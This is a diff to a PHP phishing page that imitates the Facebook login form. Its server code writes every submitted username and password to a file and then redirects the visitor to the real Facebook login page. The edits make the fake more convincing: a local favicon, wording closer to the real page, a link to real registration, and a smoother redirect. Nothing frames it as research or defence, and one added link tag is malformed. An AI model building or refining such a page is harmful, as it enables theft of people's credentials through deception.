@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Facebook</title>
-<link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<link rel="icon" type="image/x-icon" href="./facebook.ico">
 <style>
 	body {
 		font-family: 'Arial', sans-serif;
@@ -63,7 +63,7 @@
 	.create-account-btn {
 		margin-top: 10px;
 		color: #1877f2;
-		cursor: pointer;
+		text-decoration: none;
 	}
 </style>
 </head>
@@ -72,11 +72,11 @@
 <div class="login-container">
     <h2>Log in to Facebook</h2>
     <form class="login-form" action="" method="post">
-        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <input type="text" name="username" placeholder="Email address or phone number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
     </form>
-    <div class="create-account-btn">Create New Account</div>
+		<div class="create-account-btn"><a href="https://www.facebook.com/register"/a>Create New Account</div>
 </div>
 
 </body>
@@ -106,8 +106,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------FACEBOOK-------------------|\n";
+    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------FACEBOOK-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-    header("Location: https://www.facebook.com");
+    header("Location: https://www.facebook.com/login");
 }
 ?>
